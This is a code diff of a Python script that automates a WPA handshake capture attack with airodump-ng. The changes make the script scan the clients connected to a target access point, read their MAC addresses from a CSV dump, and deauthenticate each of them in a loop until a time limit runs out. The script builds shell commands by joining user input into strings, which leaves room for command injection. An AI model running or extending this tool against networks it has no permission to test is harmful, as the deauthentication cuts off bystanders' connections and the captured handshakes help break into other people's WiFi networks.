@@ -6,6 +6,7 @@ import atexit
 # import pandas
 import time
 import re # regex to validate MAC addresses
+import csv # to read airodump output file
 
 
 ###############################################################
@@ -43,7 +44,7 @@ def main():
 		sys.exit('Please run as root')
 	try:
 		environmentSetup()
-		# killInterference()
+		killInterference()
 		while targetBSSID == "" or channel == "":
 			getTargetAccessPoint()
 		captureHandshake()
@@ -175,10 +176,11 @@ def getTargetAccessPoint():
 		while channel == '':
 			user_input = input("Channel number to listen to (0 to scan multiple): ")
 			if user_input.isdigit() and 0 <= int(user_input) <= 14:
-				channel = int(user_input)
+				channel = user_input
 		scanAccessPoints(interfaceName, channel)
 		result = input("Start new scan? (y=yes): ")
 		if result == 'y' or result == 'yes' or result == '1':
+			channel = ''
 			continue
 		else:
 			break
@@ -286,6 +288,14 @@ def captureHandshake():
 	global targetBSSID
 	global interfaceName
 
+	# listen for a WPA handshake, run for given amount of time, deauthing
+	# clients meanwhile
+	scanTime = ''
+	while not scanTime.isdigit():
+		scanTime = input("Time limit to listen for WPA handshake (seconds): ")
+
+	# TODO: Can't figure out how to read output of airodump for successful
+	# handshake capture. So run it interactively after the deauthentication.
 	print("Starting packet dump of AP: " + targetBSSID)
 	airodump_proc = bash_command("airodump-ng" +
 			" -c " + str(channel) +
@@ -293,17 +303,24 @@ def captureHandshake():
 			" --output-format cap" +
 			" -w " + packetPath + "packet" +
 			" " + str(interfaceName),
-			stdout=subprocess.PIPE,
-			stderr=subprocess.PIPE,
-			stdin=subprocess.PIPE)
-	clientMacAddress = scanClientsForAccessPoint()
-	deauthenticateClient(clientMacAddress)
-	time.sleep(8)
+			stdout=None,
+			stderr=None,
+			stdin=None)
+
+	timeStart = time.time()
+	while True:
+		client_list = scanClientsForAccessPoint()
+		for client in client_list:
+			deauthenticateClient(client)
+		if time.time()-timeStart > int(scanTime):
+			break
+
+	time.sleep(10)
 	print("Killing packet dump of AP: " + targetBSSID)
 	airodump_proc.terminate()
 
 
-def scanClientsForAccessPoint(targetESSID=None):
+def scanClientsForAccessPoint(targetESSID=None, scanTime=5):
 	global targetBSSID
 	global channel
 	global interfaceName
@@ -315,27 +332,35 @@ def scanClientsForAccessPoint(targetESSID=None):
 		print("Scanning clients connected to access point " + targetESSID + "...")
 
 	# List all clients connected to target AP
-	scanTime = ''
-	while not scanTime.isdigit():
-		scanTime = input("Time limit to listen (seconds): ")
-	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(targetBSSID) + " " + str(interfaceName), stdout=None, stderr=None)
+	# scanTime = ''
+	# while not scanTime.isdigit():
+	# 	scanTime = input("Time limit to listen for clients (seconds): ")
+	process = bash_command("airodump-ng -c " + channel + " -w " + packetPath+"client" + " --bssid " + str(targetBSSID) + " " + str(interfaceName), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+	# wait for airodump to dump client csv list
+	timeStart = time.time()
+	while not os.path.isfile(packetPath+"client-01.csv"):
+		if time.time()-timeStart > scanTime:
+			print("took too long")
+			break
+		time.sleep(1)
+	# wait for scan of clients
 	time.sleep(int(scanTime))
+	# read output csv file for clients
+	with open(packetPath+'client-01.csv') as csvfile:
+		client_reader = csv.reader(csvfile, delimiter=',', quotechar='|')
+		client_dump = [line for line in client_reader]
+
+	# find clients in dump file
+	for i, line in enumerate(client_dump):
+		if 'Station MAC' in line:
+			client_dump = client_dump[i+1:]
+			break
+	client_list = [line[0] for line in client_dump if len(line)>0]
+	print("Found clients:")
+
 	process.terminate()
-
-	# Have user select client to use
-	# TODO: Automatically select a client to use
-	# TODO: Allow for option to choose strongest
-	# colnames = ['BSSID', 'ESSID']
-	# accessPoints = pandas.read_csv('dump-01.csv', names=colnames)
-	# bssids = accessPoints.BSSID.tolist()
-	# essids = accessPoints.ESSID.tolist()
-	# print(bssids)
-	# print("\n\n" + essids)
-	clientMacAddress = ''
-	while not validMacAddress(clientMacAddress):
-		clientMacAddress = input("Please select client (BSSID 2) to deauthenticate: ")
-
-	return clientMacAddress
+	return client_list
 
 
 def deauthenticateClient(clientMacAddress, targetESSID=None):
